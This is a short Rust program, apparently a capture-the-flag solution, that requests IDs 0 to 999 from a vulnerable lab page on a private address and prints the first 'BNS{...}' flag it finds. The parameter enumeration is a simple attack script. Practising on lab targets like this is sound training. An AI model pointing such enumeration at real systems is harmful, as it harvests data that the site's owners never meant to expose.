use std::error::Error;

use reqwest::blocking::*;

const URL: &'static str = "http://10.164.2.70/vulnerabilities/open_redirect/source/info.php";

pub fn run() -> Result<(), Box<dyn Error>> {
    for id in 0..1000 {
        let query = format!("{}?id={}", URL, id);
        let body = reqwest::blocking::get(query)?.text()?;

        if let Some(index) = body.find("BNS{") {
            let end_index = body[index..].find("}");
            if let Some(end_idx) = end_index {
                let flag = &body[index..index + end_idx + 1];
                println!("ID: {}", id);
                println!("Found flag: {}", flag);
                break;
            }
        }
    }

    Ok(())
}
